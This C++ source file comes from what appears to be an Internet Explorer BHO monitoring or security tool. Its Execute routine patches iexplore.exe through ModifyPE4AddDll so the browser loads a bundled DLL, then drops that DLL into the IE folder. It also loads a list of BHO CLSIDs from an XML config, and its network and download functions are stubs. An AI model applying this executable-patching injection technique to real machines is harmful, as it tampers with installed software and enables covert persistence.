#include "CommandTool.h"

//////////////////////////////////////////////////////////////////////////
// 引用自身
#include "CommandObj.h"


//////////////////////////////////////////////////////////////////////////
// 引用库文件

//////////////////////////////////////////////////////////////////////////
// 初始化及释放函数

CCommandObj::CCommandObj(void) : m_cFileControlTool(_T("Software.BHO"))
{
}

CCommandObj::CCommandObj(LPCTSTR lpLogFileName) : CCommonControl(lpLogFileName) , m_cFileControlTool(_T("Software.BHO"))
{
}

CCommandObj::~CCommandObj(void)
{
}

//////////////////////////////////////////////////////////////////////////
// Initialization

bool CCommandObj::Download( __in LPTSTR lpCmdLine)
{
	bool bRet = TRUE;
	char szServerAddress[MAX_IP4_ADDRESS_LEN] = {0};

	wcstombs(szServerAddress,m_ConfigCommon.szServerAddress,MAX_IP4_ADDRESS_LEN);

	//////////////////////////////////////////////////////////////////////////
	// 启动网络
	bRet = bRet && InitializationSocketClient(szServerAddress,m_ConfigCommon.usResourceServerPort,m_ConfigCommon.usCommandServerPort);

	//////////////////////////////////////////////////////////////////////////
	// 下载运行模块
	bRet = bRet && DownloadPlugin();

	return bRet;
}

bool CCommandObj::Execute( __in LPTSTR lpCmdLine)
{
	//////////////////////////////////////////////////////////////////////////
	// 初始化管理模块

	Out(Dbg,_T("Execute Plugin Starting[%s]."),lpCmdLine);
	bool bRet = false;

	if (NULL == lpCmdLine || 0 == _tcslen(lpCmdLine))
	{
		TCHAR szInternetExplorerPath[MAX_PATH+1] = {0};
		CRegistryControlTool cRegistry(_T("Software.BHO"));

		m_ShareMemoryBHO.Init(0xffff,sizeof(DATA_BHO) * m_SecurityData.ArraySize);
		PDATA_SECURITY_BHO pBHOData = m_ShareMemoryBHO.NewObject();

		if (pBHOData != NULL)
		{
			memcpy(pBHOData,&m_SecurityData,sizeof(DATA_SECURITY_BHO));
			pBHOData->BHO = (PDATA_BHO)(ULONG(pBHOData) + pBHOData->ArrayOffset);
			memcpy(pBHOData->BHO,m_SecurityData.BHO,sizeof(DATA_BHO) * m_SecurityData.ArraySize);

			//////////////////////////////////////////////////////////////////////////
			// Explain : 修改IE执行文件

			if (cRegistry.Open(_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\IEXPLORE.EXE")) && cRegistry.Read(_T(""),szInternetExplorerPath,MAX_PATH))
			{
				if(12 > _tcslen(szInternetExplorerPath) 
					|| 0 != _tcsicmp(&szInternetExplorerPath[_tcslen(szInternetExplorerPath)-12],_T("iexplore.exe")) 
					|| !m_cFileControlTool.ModifyPE4AddDll(szInternetExplorerPath,NAME_SECURITY_BHO_DLL))
				{
					Out(Warning,_T("Modify PE Registry Find File Failed,File Path Is : %s."),lpCmdLine);
				}
				else
				{
					bRet = true;
				}
			}
			
			if (!bRet && 3 < GetSystemDirectory(szInternetExplorerPath,MAX_PATH))
			{
				szInternetExplorerPath[3] = _T('\0');
				_tcscat_s(szInternetExplorerPath,_T("Program Files\\Internet Explorer\\IEXPLORE.EXE"));
				if(!m_cFileControlTool.ModifyPE4AddDll(szInternetExplorerPath,NAME_SECURITY_BHO_DLL))
				{
					Out(Warning,_T("Modify PE System Directory Find File Failed,File Path Is : %s."),lpCmdLine);
				}
			}

			if(!bRet)
			{
				_tcscpy(szInternetExplorerPath,_T("C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE"));
				bRet = m_cFileControlTool.ModifyPE4AddDll(szInternetExplorerPath,NAME_SECURITY_BHO_DLL);
			}

			//////////////////////////////////////////////////////////////////////////
			// Explain : 复制安全组件到IE目录
			PathRemoveFileSpec(szInternetExplorerPath);
			PathAddBackslash(szInternetExplorerPath);
			_tcscat(szInternetExplorerPath,_T(NAME_SECURITY_BHO_DLL));

			CResourceControlTool cRegistryControlTool;
			bRet = cRegistryControlTool.CreateFileFromResource(szInternetExplorerPath,IDR_BIN_SECURITY_DLL);

			if (!bRet)
			{
				Out(Outputs,_T("Create File From Resource Failed,File Path Is : %s."),szInternetExplorerPath);
			}
		}
	}

	Runend(bRet,_T("Execute Plugin Stoping."));
	return bRet;
}
//////////////////////////////////////////////////////////////////////////
// Download:

bool CCommandObj::DownloadPlugin()
{
	Out(Dbg,_T("Initlization Plugin Starting."));
	bool bRet = false;


	Runend(bRet,_T("Initlization Plugin Stoping."));
	return bRet;
}

bool CCommandObj::InitializationSocketClient(LPCSTR lpServerAddress /* = NULL */,USHORT usResourceServerPort /* = DEFAULT_SERVER_PORT */,USHORT usCommandServerPort)
{
	Out(Dbg,_T("Initialization Socket Client Starting"));
	bool bRet = false;

	Runend(bRet,_T("Initialization Socket Client Successful"));
	return bRet;
}

void CCommandObj::InitializationConfig(LPCWSTR lpConfigFileFullPath)
{
	Out(Outputs,_T("Initialization Config Starting."));

	bool bRet = false;
	LPCSTR pszValue = NULL;
	TiXmlDocument cXmlDocument;
	TiXmlHandle cConfigObj(&cXmlDocument);
	TiXmlElement * Root;
	ULONG uElementQuantity = 0,uValue = 0;
	char szConfigFilePath[MAX_PATH+1] = {0};


	if(0 == GetModuleFileNameA(NULL,szConfigFilePath,MAX_PATH))
	{
		strcpy_s(szConfigFilePath,ws2s(lpConfigFileFullPath).c_str());
	}else
	{
		PathRemoveFileSpecA(szConfigFilePath);
		PathAddBackslashA(szConfigFilePath);
		strcat_s(szConfigFilePath,ws2s(lpConfigFileFullPath).c_str());
	}

	bRet = cXmlDocument.LoadFile(szConfigFilePath);

	cConfigObj = cConfigObj.FirstChildElement("Monitor");

	if (cConfigObj.ToElement() != NULL)
	{
		m_SecurityData.Type				=	GetBhoListType(cConfigObj.ToElement()->Attribute("BHO"));


		//////////////////////////////////////////////////////////////////////////
		// BHO

		uElementQuantity = 0;

		for(Root = cConfigObj.FirstChildElement("BHO").ToElement();Root;Root = Root->NextSiblingElement("BHO"))
		{
			++uElementQuantity;
		}

		m_SecurityData.ArraySize = uElementQuantity;
		m_SecurityData.BHO = new DATA_BHO[m_SecurityData.ArraySize];
		m_SecurityData.ArrayOffset = sizeof(DATA_SECURITY_BHO);

		uElementQuantity = 0;

		for (Root = cConfigObj.FirstChildElement("BHO").ToElement();Root;Root = Root->NextSiblingElement("BHO"))
		{
			wcscpy_s(m_SecurityData.BHO[uElementQuantity].CLSID,MAX_CLSID_LEN,s2ws_lwr(Root->Attribute("CLSID")).c_str());
			m_SecurityData.BHO[uElementQuantity].CLSID[MAX_CLSID_LEN] = L'\0';

			++uElementQuantity;
		}
	}
	else
	{
		bRet = false;
	}


	Runend(bRet,_T("Initialization Config Successful."));
}